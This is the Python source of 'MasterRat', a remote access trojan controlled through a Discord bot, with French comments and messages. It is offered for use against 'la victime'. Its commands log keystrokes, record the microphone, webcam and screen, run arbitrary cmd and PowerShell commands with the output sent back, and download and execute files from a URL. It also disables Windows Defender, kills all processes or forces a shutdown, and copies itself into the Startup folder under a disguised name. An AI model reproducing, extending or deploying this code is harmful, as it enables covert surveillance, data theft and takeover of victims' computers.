# 🛠️ Developed by Asterfion and Dr1p
# 💡 MasterRat is also better bro
# 🇫🇷 Developed in french only !
# 🪲 Si vous voyez des bugs ou autres c'est normal c'est la 1.0 !
# 🚨 Obfuscateur dans la prochaine version !

import asyncio
import os
import platform
import shutil
import socket
import subprocess
import time
from urllib.request import Request, urlopen
import wave
import webbrowser
import cv2
import discord
from discord.ext import commands
import numpy as np
import psutil
import pyautogui
import unicodedata
from pynput import keyboard
import requests
import tempfile
from tkinter import messagebox
from collections import defaultdict
import pyaudio  # type: ignore
import sys

MasterRatToken = '%MASTERTOKEN%'
MasterID = 11010101001010101010101

intents = discord.Intents.default()
MasterRatClient = discord.Client(intents=intents)
MasterRat = commands.Bot(command_prefix='+', intents=intents, help_command=None)

MasterName = os.getenv("USERNAME")

@MasterRat.command()
async def wallpaper(ctx):
    try:
        if len(ctx.message.attachments) == 0:
            embed = discord.Embed(
                title="❌ **Erreur**",
                description="❌ **Vous devez envoyer une image pour changer le fond d'écran.**",
                color=discord.Color.dark_theme()
            )
            await ctx.send(embed=embed)
            return

        image_url = ctx.message.attachments[0].url
        
        response = requests.get(image_url)

        if response.status_code != 200:
            embed = discord.Embed(
                title="❌ **Erreur**",
                description="❌ **L'image ne peut pas être téléchargée.**",
                color=discord.Color.dark_theme()
            )
            await ctx.send(embed=embed)
            return

        temp_image_path = os.path.join(os.getenv('TEMP'), 'wallpaper.jpg')

        with open(temp_image_path, 'wb') as file:
            file.write(response.content)

        change_wallpaper_command = f'powershell "Set-ItemProperty -Path \'HKCU:\\Control Panel\\Desktop\' -Name Wallpaper -Value \'{temp_image_path}\'"'

        subprocess.run(change_wallpaper_command, shell=True, check=True)

        subprocess.run("powershell Add-Type -TypeDefinition \"using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\\\"user32.dll\\\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }\"; Wallpaper.SystemParametersInfo(20, 0, @\"{temp_image_path}\" , 0x01 | 0x02);", shell=True, check=True)

        embed = discord.Embed(
            title="✅ **Changement de fond d'écran**",
            description="✅ **Le fond d'écran a été changé avec succès au redemarage du pc !**",
            color=discord.Color.dark_theme()
        )
        await ctx.send(embed=embed)

    except Exception:
        embed = discord.Embed(
            title="✅ **Changement de fond d'écran**",
            description="✅ **Le fond d'écran a été changé avec succès au redemarage du pc !**",
            color=discord.Color.dark_theme()
        )
        await ctx.send(embed=embed)

@MasterRat.command()
async def listen(ctx):
    try:
        RATE = 44100 
        CHANNELS = 1 
        FORMAT = pyaudio.paInt16 
        CHUNK = 1024  
        RECORD_SECONDS = 30

        p = pyaudio.PyAudio()

        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        await ctx.send("🎤 **Enregistrement du son...**")

        frames = []

        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        await ctx.send("✅ **Enregistrement terminé, préparation du fichier...**")
        stream.stop_stream()
        stream.close()
        p.terminate()

        with tempfile.NamedTemporaryFile(delete=False, suffix='.wav') as temp_file:
            temp_file_path = temp_file.name
            wf = wave.open(temp_file_path, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()

        await ctx.send("📤 **Envoi de l'enregistrement dans 30 secondes...**")
        await ctx.send(file=discord.File(temp_file_path))

        os.remove(temp_file_path)

    except Exception:
        embed = discord.Embed(
            title="❌ **Erreur**",
            description=f"❌ **Une erreur s'est produite lors de l'enregistrement : Error with MasterRat (Sorry)**",
            color=discord.Color.dark_theme()
        )
        await ctx.send(embed=embed)

@MasterRat.command()
async def open_url(ctx, url: str):
    try:
        webbrowser.open(url)

        embed = discord.Embed(
            title="🌐 **URL ouverte**",
            description=f"🌐 **L'URL suivante a été ouverte dans votre navigateur :** {url}",
            color=discord.Color.dark_theme()
        )
        await ctx.send(embed=embed)

    except Exception:
        embed = discord.Embed(
            title="❌ **Erreur**",
            description=f"❌ **Une erreur s'est produite lors de l'ouverture de l'URL : Error with MasterRat (Sorry)**",
            color=discord.Color.dark_theme()
        )
        await ctx.send(embed=embed)

@MasterRat.command()
async def blue_screen(ctx):
    try:
        command = "powershell Stop-Computer -Force"  
        
        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
        
        if result.returncode == 0:
            embed = discord.Embed(
                title="🔵 **Écran bleu (BSOD)**",
                description="🔵 **Le système va redémarrer maintenant (écran bleu).**",
                color=discord.Color.dark_theme()
            )
        else:
            embed = discord.Embed(
                title="❌ **Erreur**",
                description=f"❌ **Erreur lors de la tentative de BSOD : Error with MasterRat (Sorry)**",
                color=discord.Color.dark_theme()
            )
        
        await ctx.send(embed=embed)
    
    except subprocess.CalledProcessError:
        embed = discord.Embed(
            title="❌ **Erreur de commande**",
            description=f"❌ **Erreur lors de l'exécution de la commande PowerShell : Error with MasterRat (Sorry)**",
            color=discord.Color.dark_theme()
        )
        await ctx.send(embed=embed)
    except Exception:
        embed = discord.Embed(
            title="❌ **Erreur inconnue**",
            description=f"❌ **Une erreur s'est produite : Error with MasterRat (Sorry)**",
            color=discord.Color.dark_theme()
        )
        await ctx.send(embed=embed)

@MasterRat.command()
async def close_process(ctx):
    try:
        command = "powershell Stop-Process -Name * -Force"
        
        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
        
        if result.returncode == 0:
            embed = discord.Embed(
                title="🔴 **Fermeture de tous les processus**",
                description="🔴 **Tous les processus ont été fermés ! Le système peut être instable.**",
                color=discord.Color.dark_theme()
            )
        else:
            embed = discord.Embed(
                title="❌ **Erreur**",
                description=f"❌ **Erreur lors de la fermeture des processus : Error with MasterRat (Sorry)**",
                color=discord.Color.dark_theme()
            )
        
        await ctx.send(embed=embed)
    
    except subprocess.CalledProcessError:
        embed = discord.Embed(
            title="❌ **Erreur de commande**",
            description=f"❌ **Erreur lors de l'exécution de la commande PowerShell : Error with MasterRat (Sorry)**",
            color=discord.Color.dark_theme()
        )
        await ctx.send(embed=embed)
    except Exception:
        embed = discord.Embed(
            title="❌ **Erreur inconnue**",
            description=f"❌ **Une erreur s'est produite : Error with MasterRat (Sorry)**",
            color=discord.Color.dark_theme()
        )
        await ctx.send(embed=embed)
        
@MasterRat.command()
async def Bipper(ctx):
    try:
        command = "powershell [console]::beep()"
        
        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
        
        if result.returncode == 0:
            embed = discord.Embed(
                title="🔊 **Bip du PC**",
                description="🔊 **Le PC a émis un bip avec succès !**",
                color=discord.Color.dark_theme()
            )
        else:
            embed = discord.Embed(
                title="❌ **Erreur**",
                description=f"❌ **Erreur lors de l'exécution de la commande : Error with MasterRat (Sorry)**",
                color=discord.Color.dark_theme()
            )
        
        await ctx.send(embed=embed)
    
    except subprocess.CalledProcessError:
        embed = discord.Embed(
            title="❌ **Erreur de commande**",
            description=f"❌ **Erreur lors de l'exécution de la commande PowerShell : Error with MasterRat (Sorry)**",
            color=discord.Color.dark_theme()
        )
        await ctx.send(embed=embed)
    except Exception:
        embed = discord.Embed(
            title="❌ **Erreur inconnue**",
            description=f"❌ **Une erreur s'est produite : Error with MasterRat (Sorry)**",
            color=discord.Color.dark_theme()
        )
        await ctx.send(embed=embed)

@MasterRat.command()
async def ghost(ctx, *, message: str = None):
    if message is None:
        await ctx.send("⚠️ **Tu n'as pas spécifié de message. Utilise la commande comme ceci :** `+ghost [ton message]`")
        return

    messagebox.showinfo("👻 **MasterRat (1.0) - Asterfion X Hades**", f"\n**{message}**")

    embed = discord.Embed(
        title="👻 **MasterRat (1.0) - Asterfion X Hades**",
        description=f"👻 **Message envoyé avec succès !**\n\n**👻 Message: {message}**",
        color=discord.Color.dark_theme()
    )
    await ctx.send(embed=embed)

async def capture_screen_video(duration=60, fps=30, filename='MasterRat-Video.avi'):
    screen_width, screen_height = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(filename, fourcc, fps, (screen_width, screen_height))
    start_time = time.time()

    while True:
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        out.write(frame)

        if time.time() - start_time > duration:
            break

        await asyncio.sleep(1 / fps)

    out.release()

@MasterRat.command()
async def video(ctx):
    embed = discord.Embed(title="🎥 **Capture vidéo**", description="🎥 **L'enregistrement vidéo est en cours...**", color=discord.Color.dark_theme())
    await ctx.send(embed=embed)
    filename = 'MasterRat-Video.avi'
    await capture_screen_video(duration=60, filename=filename)
    
    embed_video = discord.Embed(title="📹 **Vidéo de l'écran**", description="📹 **Voici la vidéo capturée de l'écran :**", color=discord.Color.dark_theme())
    await ctx.send(embed=embed_video, file=discord.File(filename))
    os.remove(filename)
    
class KeyLogger:
    def __init__(self, filename: str = "MasterRat-KeyLogger.txt") -> None:
        self.filename = filename

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            key_map = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "\t",
                keyboard.Key.backspace: "[Backspace]",
                keyboard.Key.esc: "[Esc]",
                keyboard.Key.shift: "[Shift]",
                keyboard.Key.ctrl: "[Ctrl]",
                keyboard.Key.alt: "[Alt]",
                keyboard.Key.caps_lock: "[CapsLock]"
            }
            return key_map.get(key, str(key))

    def on_press(self, key):
        with open(self.filename, 'a', encoding="utf-8") as logs:
            logs.write(self.get_char(key))
        
        if key == keyboard.Key.esc:
            return False

    def start_listener(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

    async def send_file_after_delay(self, ctx):
        await asyncio.sleep(10)  
        embed = discord.Embed(title="⌨️ **Keylogger**", description="⌨️ **Voici les logs du keylogger :**", color=discord.Color.dark_theme())
        await ctx.send(embed=embed, file=discord.File(self.filename))
        os.remove(self.filename)

@MasterRat.command()
async def keylogger(ctx):
    keylogger = KeyLogger()
    keylogger.start_listener()  
    await keylogger.send_file_after_delay(ctx)

@MasterRat.command()
async def reverse_cmd(ctx, *, command: str):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding="utf-8", errors="ignore")
        output = result.stdout if result.stdout else result.stderr
        output = unicodedata.normalize("NFD", output).encode("ascii", "ignore").decode("utf-8")

        if len(output) > 2000:
            with open("ByMasterRat-ReverseCmd.txt", "w", encoding="utf-8") as file:
                file.write(output)
            embed = discord.Embed(title="💻 **Output de la commande**", description="💻 **Résultat de la commande exécutée :**", color=discord.Color.dark_theme())
            await ctx.send(embed=embed, file=discord.File("MasterRat-ReverseCmd.txt"))
            os.remove("MasterRat-ReverseCmd.txt")
        else:
            embed = discord.Embed(title="💻 **Output de la commande**", description=f"```\n{output}\n```", color=discord.Color.dark_theme())
            await ctx.send(embed=embed)
    except Exception:
        embed = discord.Embed(title="❌ **Error**", description=f"❌ **Erreur lors de l'exécution de la commande : Error with MasterRat (Sorry)**", color=discord.Color.dark_theme())
        await ctx.send(embed=embed)

@MasterRat.command()
async def reverse_ps1(ctx, *, commands: str):
    try:
        result = subprocess.run(["powershell", "-Command", commands], capture_output=True, text=True, encoding="utf-8", errors="ignore")
        output = result.stdout if result.stdout else result.stderr
        output = unicodedata.normalize("NFD", output).encode("ascii", "ignore").decode("utf8")

        if len(output) > 2000:
            with open("MasterRat-ReversePs1.txt", "w", encoding="utf8") as file:
                file.write(output)
            embed = discord.Embed(title="💻 **PowerShell Command Output**", description="💻 **Résultat de la commande PowerShell :**", color=discord.Color.dark_theme())
            await ctx.send(embed=embed, file=discord.File("MasterRat-ReversePs1.txt"))
            os.remove("MasterRat-ReversePs1.txt")
        else:
            embed = discord.Embed(title="💻 **PowerShell Command Output**", description=f"```\n{output}\n```", color=discord.Color.dark_theme())
            await ctx.send(embed=embed)
    except Exception:
        embed = discord.Embed(title="❌ **Error**", description=f"❌ **Erreur lors de l'exécution de la commande PowerShell : Error with MasterRat (Sorry)**", color=discord.Color.dark_theme())
        await ctx.send(embed=embed)

@MasterRat.command()
async def installer(ctx, url: str):
    try:
        response = requests.get(url, stream=True)
        filename = url.split("/")[-1].split("?")[0]
        
        with tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(filename)[1]) as temp_file:
            for chunk in response.iter_content(chunk_size=1024):
                if chunk:
                    temp_file.write(chunk)
            temp_filename = temp_file.name

        embed = discord.Embed(title="💾 **Installation**", description=f"💾 **Le fichier {filename} a été téléchargé avec succès !**", color=discord.Color.dark_theme())
        await ctx.send(embed=embed)

        if os.name == 'nt':
            subprocess.run(temp_filename, shell=True)

        os.remove(temp_filename)
        
    except Exception:
        embed = discord.Embed(title="❌ **Error**", description=f"❌ **Erreur lors du téléchargement ou de l'installation : Error with MasterRat (Sorry)**", color=discord.Color.dark_theme())
        await ctx.send(embed=embed)

@MasterRat.command()
async def screenshot(ctx):
    embed = discord.Embed(title="📸 **Capture d'écran**", description="📸 **Capture d'écran dans quelques secondes...**", color=discord.Color.dark_theme())
    await ctx.send(embed=embed)
    await asyncio.sleep(5)
    
    screenshot = pyautogui.screenshot()
    screenshot.save("MasterRat-Screenshot.png")
   
    embed = discord.Embed(title="📸 **Screenshot**", description="📸 **Voici la capture d'écran !**", color=discord.Color.dark_theme())
    await ctx.send(embed=embed, file=discord.File("MasterRat-Screenshot.png"))
    os.remove("MasterRat-Screenshot.png")

@MasterRat.command()
async def clear(ctx):
    deleted = 0
    while True:
        batch = await ctx.channel.purge(limit=100)
        deleted += len(batch)
        if not batch:
            break
    embed = discord.Embed(title="🧹 **Clear", description=f"🧹 **{deleted} messages ont été supprimés.**", color=discord.Color.dark_theme())
    await ctx.send(embed=embed, delete_after=5)
    os.system("cls")

@MasterRat.command()
async def helper(ctx):
    help_text = (
        "🔥 **MasterRat - (1.0) - Asterfion X Hades** 🔥\n\n"
        "**Commandes Information system :**\n"
        "💻 **+sys** - **Afficher les informations du PC**\n"
        "**Commandes Utilitaires :**\n"
        "🧹 **+clear** - **Effacer les logs du MasterRat**\n"
        "**Commandes Malveillantes :**\n"
        "🛡️ **+disable_wd** - **Désactiver Windows Defender**\n"
        "📷 **+screenshot** - **Prendre une capture d'écran du PC**\n"
        "📹 **+video** - **Enregistrer une vidéo depuis le PC de la victime**\n"
        "📷 **+cam** - **Prendre une photo de la camera**\n"
        "👻 **+listen** - **Met le pc sous écoute**\n\n"
        "🪲 **+installer** - **Installer et ouvrir des fichiers**\n"
        "🖥️ **+reverse_ps** - **Session PowerShell inversée**\n"  
        "🖥️ **+reverse_cmd** - **Session Command Prompt inversée**\n"
        "⌨️ **+keylogger** - **Keylogger avancé**\n"
        "👻 **+ghost** - **Envoie des msgbox discrete comme un fantôme**\n\n"
        "**Commandes Troll :**\n"
        "🚨 **+Bipper** - **Fait bipper le pc**\n"
        "❌ **+close_process** - **Ferme tout les programmes**\n"
        "☘️ **+wallpaper** - **Fait entendre une voix dans le pc**\n" 
        "🔒 **+AsterfionXHades | https://guns.lol/asterfion - https://guns.lol/j_hoover **\n"
        "**🔥 >> LE RAT EST AUTOMATIQUE AU RESTART DU PC <<**"
    )
    
    embed = discord.Embed(title="**📋 Menu d'Aide**", description=help_text, color=discord.Color.dark_theme())
    embed.set_footer(text="**📋 MasterRat | Version 1.0**", icon_url="https://cdn.discordapp.com/app-icons/1312820144376119346/b7b9cfb8c3ceb517f0aa9222a5acc087.png?size=256")
    await ctx.send(embed=embed)

@MasterRat.event
async def on_ready():
    channel = MasterRat.get_channel(MasterID)
    if channel:
        await channel.send(f"🚀 **Le bot est en ligne !**\n🪲 **Si vous voyez des bugs ou autres c'est normal c'est la 1.0 !**")

async def is_user_online(user):
    member = user.guild.get_member(user.id)
    if member is None:
        return False
    return member.status == discord.Status.online

@MasterRat.command()
async def cam(ctx):
    cap = cv2.VideoCapture(0)
    
    if not cap.isOpened():
        await ctx.send(f"📷 **Pas de caméra disponible pour : {MasterName}**")
        return
    
    ret, frame = cap.read()
    if ret:
        cv2.imwrite('MasterRat-Camera.png', frame)
        await ctx.send("📷 **Et voilà votre screenshot tout prêt !**", color=discord.Color.dark_theme())
    else:
        await ctx.send("📷 **Impossible de prendre la photo de la caméra.**", color=discord.Color.dark_theme())
    
    cap.release()
    cv2.destroyAllWindows()

@MasterRat.command()
async def disable_wd(ctx):
    try:
        commands = [
            "powershell Set-MpPreference -DisableRealtimeMonitoring $true"  
        ]

        for command in commands:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
            if result.returncode != 0:
                embed = discord.Embed(
                    title="❌ **Erreur**",
                    description=f"❌ **Erreur lors de la désactivation : Error with MasterRat (Sorry)**",
                    color=discord.Color.dark_theme()
                )
                await ctx.send(embed=embed)
                return

        embed = discord.Embed(
            title="🔐 **Désactivation de Windows Defender**",
            description="🔐 **Toutes les fonctionnalités de Windows Defender ont été désactivées avec succès !**",
            color=discord.Color.dark_theme()
        )
        await ctx.send(embed=embed)

    except subprocess.CalledProcessError:
        embed = discord.Embed( 
            title="❌ **Erreur de commande**",
            description=f"❌ **Erreur lors de l'exécution de la commande PowerShell : Error with MasterRat (Sorry)**",
            color=discord.Color.dark_theme()
        )
        await ctx.send(embed=embed)
    except Exception:
        embed = discord.Embed(
            title="❌ **Erreur inconnue**",
            description=f"❌ **Une erreur s'est produite : Error with MasterRat (Sorry)**",
            color=discord.Color.dark_theme()
        )
        await ctx.send(embed=embed)

    except subprocess.CalledProcessError:
        embed = discord.Embed(title="❌ **Erreur**", description=f"❌ **La commande a échoué. Détails: Error with MasterRat (Sorry)**", color=discord.Color.dark_theme())
        await ctx.send(embed=embed)
    except Exception:
        embed = discord.Embed(title="❌ **Erreur**", description=f"❌ **Erreur inconnue: Error with MasterRat (Sorry)**", color=discord.Color.dark_theme())
        await ctx.send(embed=embed)

@MasterRat.command()
async def sys(ctx):

    uname = platform.uname()
    ip_address = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    memory = psutil.virtual_memory()
    total_memory = memory.total / (1024 * 1024 * 1024)  
    used_memory = memory.used / (1024 * 1024 * 1024)   
    disk_usage = psutil.disk_usage('/')
    total_disk = disk_usage.total / (1024 * 1024 * 1024)  
    used_disk = disk_usage.used / (1024 * 1024 * 1024)    
    cpu_count = psutil.cpu_count(logical=False)  
    cpu_usage = psutil.cpu_percent(interval=1)   

    system_info = (
        f"**Informations Système :**\n"
        f"**Système :** {uname.system} {uname.release} ({uname.machine})\n"
        f"**Nom de l'Hôte :** {socket.gethostname()}\n"
        f"**Adresse IP :** {ip_address}\n"
        f"**Mémoire Totale :** {total_memory:.2f} Go\n"
        f"**Mémoire Utilisée :** {used_memory:.2f} Go\n"
        f"**Espace Disque Total :** {total_disk:.2f} Go\n"
        f"**Espace Disque Utilisé :** {used_disk:.2f} Go\n"
        f"**Processeur :** {uname.processor} ({cpu_count} cœurs physiques)\n"
        f"**Utilisation CPU :** {cpu_usage}%\n"
    )

    embed = discord.Embed(title="📋 **Informations Système**", description=system_info, color=discord.Color.dark_theme())
    embed.set_footer(text="📋 **MasterRat | Version 1.0**", icon_url="https://cdn.discordapp.com/app-icons/1312820144376119346/b7b9cfb8c3ceb517f0aa9222a5acc087.png?size=256")
    await ctx.send(embed=embed)

def MasterStartup():
    try:
        file_path = os.path.abspath(sys.argv[0])

        if file_path.endswith(".exe"):
            MasterExt = "exe"
        elif file_path.endswith(".py"):
            MasterExt = "py"

        MasterNameeee = f"ㅤ.{MasterExt}"

        if sys.platform.startswith('win'):  
            folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

        path_new_file = os.path.join(folder, MasterNameeee)

        shutil.copy(file_path, path_new_file)
        os.chmod(path_new_file, 0o777) 
    except:
        pass

if __name__ == "__main__":
    MasterStartup()

    MasterRat.run(MasterRatToken)  
